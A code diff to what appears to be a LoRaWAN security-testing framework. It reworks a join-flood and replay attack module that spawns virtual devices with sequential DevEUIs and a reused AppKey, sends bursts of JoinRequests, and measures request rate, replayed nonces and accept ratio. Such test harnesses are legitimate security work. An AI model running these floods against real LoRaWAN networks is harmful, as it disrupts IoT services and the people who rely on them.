@@ -28,18 +28,23 @@ class VirtualDevice:
     """Virtual device for join flood attack."""
     
     dev_eui: bytes
-    app_eui: bytes
+    join_eui: bytes
     app_key: bytes
-    dev_nonce: bytes
+    dev_nonce: bytes = b""
     
     @property
     def dev_eui_hex(self) -> str:
         return self.dev_eui.hex()
+
+    @property
+    def app_eui(self) -> bytes:
+        return self.join_eui
     
     def build_join_request(self) -> bytes:
         """Build JoinRequest for this virtual device."""
+        self.dev_nonce = secrets.token_bytes(2)
         return build_join_request(
-            app_eui=self.app_eui,
+            join_eui=self.join_eui,
             dev_eui=self.dev_eui,
             dev_nonce=self.dev_nonce,
             app_key=self.app_key,
@@ -147,11 +152,17 @@ class JoinAbuseAnalyzer(AttackAnalyzer):
         else:
             # Flood attack
             elapsed_time = 0.0
+            dev_nonces: list[str] = []
             for packet in join_requests:
                 if "elapsed_time" in packet.metadata:
                     elapsed_time = packet.metadata["elapsed_time"]
+                if "dev_nonce" in packet.metadata:
+                    dev_nonces.append(str(packet.metadata["dev_nonce"]))
             
             rate = len(join_requests) / elapsed_time if elapsed_time > 0 else 0
+            unique_dev_nonces = len(set(dev_nonces))
+            replayed_dev_nonces = max(0, len(dev_nonces) - unique_dev_nonces)
+            accept_ratio = (len(join_accepts) / len(join_requests)) if join_requests else 0.0
             
             metrics = {
                 "attack_type": "join_flood",
@@ -161,11 +172,16 @@ class JoinAbuseAnalyzer(AttackAnalyzer):
                 "request_rate_per_sec": round(rate, 2),
                 "total_uplinks": stats["total_uplinks"],
                 "total_downlinks": stats["total_downlinks"],
+                "unique_dev_nonces": unique_dev_nonces,
+                "replayed_dev_nonces": replayed_dev_nonces,
+                "join_accept_ratio": round(accept_ratio, 2),
             }
             
             message = f"Join flood executed: {len(join_requests)} requests sent"
             if elapsed_time > 0:
                 message += f" at {rate:.2f} req/s"
+            if join_accepts:
+                message += "; possible rate limiting detected"
             
             result = {
                 "success": True,
@@ -198,6 +214,35 @@ class JoinAbuseAttack(BaseAttack):
     """
     
     name = "join_abuse"
+
+    def __init__(
+        self,
+        config: Any | None = None,
+        device: Any | None = None,
+        gateway: Any | None = None,
+        logger: Any | None = None,
+        radio: Any | None = None,
+        mode: str = "flood",
+        flood_count: int = 10,
+        flood_interval_sec: float = 0.1,
+        replay_delay_sec: float = 0.5,
+        virtual_devices: int = 1,
+        expected: Any | None = None,
+        timing: Any | None = None,
+    ) -> None:
+        self.config = config
+        self.device = device
+        self.gateway = gateway
+        self.logger = logger
+        self.radio = radio
+        self.mode = mode
+        self.flood_count = flood_count
+        self.flood_interval_sec = flood_interval_sec
+        self.replay_delay_sec = replay_delay_sec
+        self.virtual_devices = virtual_devices
+        self.expected = expected
+        self.timing = timing
+        self.analyzer = JoinAbuseAnalyzer()
     
     def run(self, ctx: AttackContext) -> AttackResult:
         """
@@ -403,25 +448,44 @@ class JoinAbuseAttack(BaseAttack):
         )
     
     def _generate_virtual_devices(
-        self, ctx: AttackContext, count: int
+        self, *args: Any
     ) -> list[VirtualDevice]:
         """Generate virtual devices for flood attack."""
+        if len(args) == 1:
+            ctx = None
+            count = int(args[0])
+        elif len(args) == 2:
+            ctx = args[0]
+            count = int(args[1])
+        else:
+            raise TypeError("Expected _generate_virtual_devices(count) or _generate_virtual_devices(ctx, count)")
+
+        device = ctx.device if ctx is not None else self.device
+        if device is None:
+            raise RuntimeError("No device available to generate virtual devices")
+
+        join_eui = getattr(device, "_join_eui", None)
+        app_key = getattr(device, "_app_key", None)
+        dev_eui_bytes = getattr(device, "_dev_eui", None)
+        if join_eui is None or app_key is None or dev_eui_bytes is None:
+            raise RuntimeError("Device does not expose join device identifiers")
+
         devices = []
+        start_value = int.from_bytes(dev_eui_bytes, byteorder="big")
         
         for i in range(count):
-            dev_eui = secrets.token_bytes(8)
-            app_eui = ctx.device.identity.app_eui  # Reuse same AppEUI
-            app_key = ctx.device.keys.app_key  # Reuse same AppKey (for testing)
+            dev_eui = (start_value + i).to_bytes(8, byteorder="big")
             dev_nonce = secrets.token_bytes(2)
             
             devices.append(
                 VirtualDevice(
                     dev_eui=dev_eui,
-                    app_eui=app_eui,
+                    join_eui=join_eui,
                     app_key=app_key,
                     dev_nonce=dev_nonce,
                 )
             )
         
-        ctx.logger.debug(f"Generated {count} virtual devices for flood attack")
+        if ctx is not None:
+            ctx.logger.debug(f"Generated {count} virtual devices for flood attack")
         return devices
